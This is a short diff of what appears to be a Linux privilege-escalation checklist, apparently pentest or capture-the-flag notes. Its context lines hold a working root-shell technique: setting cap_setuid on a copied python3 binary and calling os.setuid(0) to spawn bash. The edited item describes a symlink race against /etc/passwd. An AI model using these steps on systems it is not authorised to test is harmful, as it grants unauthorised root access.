@@ -61,5 +61,4 @@ sudo setcap cap_setuid+ep ~/python3
 ~/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ## Race conditions
-
-- [ ] Root-owned script editing a file you can reach? Race it: swap the target with a symlink to /etc/passwd between its check and its write (TOCTOU)
+- [ ] A script that root runs writes a file I can reach: the file swapped for a symlink to /etc/passwd between its check and its write, a time-of-check to time-of-use race
